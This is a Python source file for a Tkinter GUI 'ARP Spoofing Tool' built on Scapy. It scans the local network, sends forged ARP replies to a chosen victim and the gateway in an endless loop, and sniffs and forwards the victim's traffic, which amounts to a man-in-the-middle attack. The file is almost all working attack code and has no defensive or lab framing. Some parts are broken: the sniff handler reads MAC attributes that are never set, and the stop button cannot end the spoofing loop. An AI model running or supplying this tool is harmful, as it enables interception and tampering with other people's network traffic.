import os
import socket
import psutil
from scapy.all import ARP, Ether, srp, send, sniff
import tkinter as tk
from tkinter import ttk
import threading
import platform
import sys

# Define the ARP Spoofing GUI class
class ARP_Spoof_GUI:
    def __init__(self, master):
        # Initialize the GUI
        self.master = master
        master.title("ARP Spoofing Tool")  # Set window title

        # Create GUI elements
        self.create_widgets()
        self.scan_thread = None
        self.attack_thread = None
        self.sniff_thread = None
        self.set_network_interfaces()  # Set default network interfaces

    # Method to create GUI elements
    def create_widgets(self):
        self.create_scan_frame()
        self.create_devices_frame()
        self.create_address_frame()
        self.create_buttons_frame()
        self.create_packet_text()

    # Method to create frame for network scan
    def create_scan_frame(self):
        self.frame_scan = ttk.Frame(self.master)
        self.frame_scan.grid(row=0, column=0, padx=10, pady=5, sticky=tk.W)

        self.label_interface = ttk.Label(self.frame_scan, text="Network Interface:")
        self.label_interface.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        self.interfaces = ttk.Combobox(self.frame_scan)
        self.interfaces.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        self.scan_button = ttk.Button(self.frame_scan, text="Scan Network", command=self.scan_network)
        self.scan_button.grid(row=0, column=2, padx=5, pady=5, sticky=tk.W)

    # Method to create frame for displaying devices
    def create_devices_frame(self):
        self.frame_devices = ttk.Frame(self.master)
        self.frame_devices.grid(row=1, column=0, padx=10, pady=5, sticky=tk.W)

        self.devices_treeview = ttk.Treeview(self.frame_devices)
        self.devices_treeview["columns"] = ("IP Address", "MAC Address")
        self.devices_treeview.heading("#0", text="Device")
        self.devices_treeview.heading("IP Address", text="IP Address")
        self.devices_treeview.heading("MAC Address", text="MAC Address")
        self.devices_treeview.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W+tk.E)

    # Method to create frame for entering victim and gateway addresses
    def create_address_frame(self):
        self.frame_address = ttk.Frame(self.master)
        self.frame_address.grid(row=2, column=0, padx=10, pady=5, sticky=tk.W)

        self.label_victim_ip = ttk.Label(self.frame_address, text="Victim IP Address:")
        self.label_victim_ip.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        self.entry_victim_ip = ttk.Entry(self.frame_address)
        self.entry_victim_ip.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)

        self.label_gateway_ip = ttk.Label(self.frame_address, text="Gateway IP Address:")
        self.label_gateway_ip.grid(row=1, column=0, padx=5, pady=5, sticky=tk.W)

        self.entry_gateway_ip = ttk.Entry(self.frame_address)
        self.entry_gateway_ip.grid(row=1, column=1, padx=5, pady=5, sticky=tk.W)

    # Method to create frame for buttons
    def create_buttons_frame(self):
        self.frame_buttons = ttk.Frame(self.master)
        self.frame_buttons.grid(row=3, column=0, padx=10, pady=5, sticky=tk.W)

        self.attack_button = ttk.Button(self.frame_buttons, text="Start Attack", command=self.start_attack)
        self.attack_button.grid(row=0, column=0, padx=5, pady=5, sticky=tk.W)

        self.stop_button = ttk.Button(self.frame_buttons, text="Stop Attack", command=self.stop_attack)
        self.stop_button.grid(row=0, column=1, padx=5, pady=5, sticky=tk.W)
        self.stop_button.configure(state=tk.DISABLED)

    # Method to create text area for displaying captured packets
    def create_packet_text(self):
        self.packet_text = tk.Text(self.master, height=10, width=70)
        self.packet_text.grid(row=4, column=0, padx=10, pady=5, sticky=tk.W+tk.E)

    # Method to set available network interfaces
    def set_network_interfaces(self):
        interfaces = self.get_network_interfaces()
        if interfaces:
            self.interfaces['values'] = list(interfaces)
            self.interfaces.set(list(interfaces)[0])

    # Method to get network interfaces
    def get_network_interfaces(self):
        try:
            if platform.system() == 'Windows':
                interfaces = psutil.net_if_addrs().keys()
            else:
                interfaces = [interface.name for interface in psutil.net_if_addrs().values()]
            return interfaces
        except Exception as e:
            print(f"Error getting network interfaces: {e}")
            return None

    # Method to initiate network scan
    def scan_network(self):
        selected_network = self.interfaces.get()
        self.scan_thread = threading.Thread(target=self.do_scan_network, args=(selected_network,))
        self.scan_thread.start()

    # Method to perform network scan
    def do_scan_network(self, selected_network):
        ip_range = self.get_ip_range(selected_network)
        if not ip_range:
            self.insert_to_treeview("Unable to get IP range for the selected network interface.")
            return

        self.insert_to_treeview(f"Scanning network: {ip_range}...")
        devices = self.scan_with_scapy(ip_range)

        unique_devices = {device['ip']: device for device in devices if device['ip'] and device['mac']}
        devices = list(unique_devices.values())

        for device in devices:
            self.insert_to_treeview(device['ip'], device['mac'])

    # Method to get IP range based on selected network interface
    def get_ip_range(self, interface):
        ip_address = self.get_ip_address(interface)
        netmask = self.get_netmask(interface)
        if ip_address and netmask:
            return self.ip_to_cidr(ip_address, netmask)
        return None

    # Method to get IP address of a network interface
    def get_ip_address(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.address
        return None

    # Method to get netmask of a network interface
    def get_netmask(self, ifname):
        addrs = psutil.net_if_addrs().get(ifname, [])
        for addr in addrs:
            if addr.family == socket.AF_INET:
                return addr.netmask
        return None

    # Method to convert IP address and netmask to CIDR notation
    def ip_to_cidr(self, ip, netmask):
        ip_bits = "".join([bin(int(x))[2:].zfill(8) for x in ip.split(".")])
        netmask_bits = "".join([bin(int(x))[2:].zfill(8) for x in netmask.split(".")])
        cidr = sum([1 for bit in netmask_bits if bit == '1'])
        return f"{ip}/{cidr}"

    # Method to perform network scan using Scapy
    def scan_with_scapy(self, ip_range):
        arp = ARP(pdst=ip_range)
        ether = Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = ether / arp

        result = srp(packet, timeout=5, verbose=False)[0]
        devices = []
        for sent, received in result:
            devices.append({'ip': received.psrc, 'mac': received.hwsrc})

        return devices

    # Method to insert device information into treeview
    def insert_to_treeview(self, ip, mac=None):
        if mac:
            self.devices_treeview.insert("", tk.END, text="Device", values=(ip, mac))
        else:
            self.devices_treeview.insert("", tk.END, text="Info", values=(ip, ""))

    # Method to start the ARP spoofing attack
    def start_attack(self):
        self.attack_button.configure(state=tk.DISABLED)
        self.stop_button.configure(state=tk.NORMAL)

        gateway_ip = self.entry_gateway_ip.get()
        victim_ip = self.entry_victim_ip.get()

        self.attack_thread = threading.Thread(target=self.do_start_attack, args=(gateway_ip, victim_ip))
        self.attack_thread.start()

        self.sniff_thread = threading.Thread(target=self.start_sniffing, args=(victim_ip,))
        self.sniff_thread.start()

    # Method to perform the ARP spoofing attack
    def do_start_attack(self, gateway_ip, victim_ip):
        victim_mac = None
        gateway_mac = None

        devices = self.scan_with_scapy(self.get_ip_range(self.interfaces.get()))

        for device in devices:
            if device['ip'] == victim_ip:
                victim_mac = device['mac']
            if device['ip'] == gateway_ip:
                gateway_mac = device['mac']

        if not victim_mac or not gateway_mac:
            self.insert_to_treeview("Could not find MAC addresses for the given IPs.")
            return

        self.insert_to_treeview(f"Starting ARP spoofing: {victim_ip} ({victim_mac}) -> {gateway_ip} ({gateway_mac})")
        try:
            while True:
                self.arp_spoof(victim_ip, victim_mac, gateway_ip)
                self.arp_spoof(gateway_ip, gateway_mac, victim_ip)
        except KeyboardInterrupt:
            self.insert_to_treeview("\nStopping ARP spoofing. Restoring network...")
            self.restore_arp(victim_ip, victim_mac, gateway_ip, gateway_mac)
            self.restore_arp(gateway_ip, gateway_mac, victim_ip, victim_mac)
            self.attack_button.configure(state=tk.NORMAL)
            self.stop_button.configure(state=tk.DISABLED)

    # Method to send ARP spoofing packets
    def arp_spoof(self, target_ip, target_mac, spoof_ip):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(packet, verbose=False)

    # Method to restore ARP tables
    def restore_arp(self, target_ip, target_mac, source_ip, source_mac):
        packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip, hwsrc=source_mac)
        send(packet, verbose=False)

    # Method to start packet sniffing
    def start_sniffing(self, victim_ip):
        sniff(filter=f"host {victim_ip}", prn=self.handle_packet)

    # Method to handle captured packets
    def handle_packet(self, packet):
        # Check if packet is from victim to gateway or vice versa
        if packet.src == self.victim_mac and packet.dst == self.gateway_mac:
            # Forward packet to gateway
            modified_packet = self.modify_packet(packet)  # Modify packet if needed
            send(modified_packet, verbose=False)
        elif packet.src == self.gateway_mac and packet.dst == self.victim_mac:
            # Forward packet to victim
            modified_packet = self.modify_packet(packet)  # Modify packet if needed
            send(modified_packet, verbose=False)
        # Display the packet summary in the GUI's text area
        self.packet_text.insert(tk.END, f"{packet.summary()}\n")
        self.packet_text.see(tk.END)

    # Method to modify intercepted packet before forwarding
    def modify_packet(self, packet):
        # Implement logic to modify packet if needed
        # For example, you might want to change the source or destination address
        # of the packet before forwarding it
        # Return the modified packet
        return packet

    # Method to stop the ARP spoofing attack
    def stop_attack(self):
        self.attack_button.configure(state=tk.NORMAL)
        self.stop_button.configure(state=tk.DISABLED)

        if self.attack_thread and self.attack_thread.is_alive():
            self.attack_thread.join()

        if self.sniff_thread and self.sniff_thread.is_alive():
            self.sniff_thread.join()

# Main function
def main():
    try:
        root = tk.Tk()
        gui = ARP_Spoof_GUI(root)
        root.protocol("WM_DELETE_WINDOW", lambda: on_close(root))
        root.mainloop()
    except Exception as e:
        print(f"GUI Error: {e}")

# Method to handle window closure event
def on_close(root):
    root.destroy()
    sys.exit(0)

# Entry point of the program
if __name__ == "__main__":
    main()
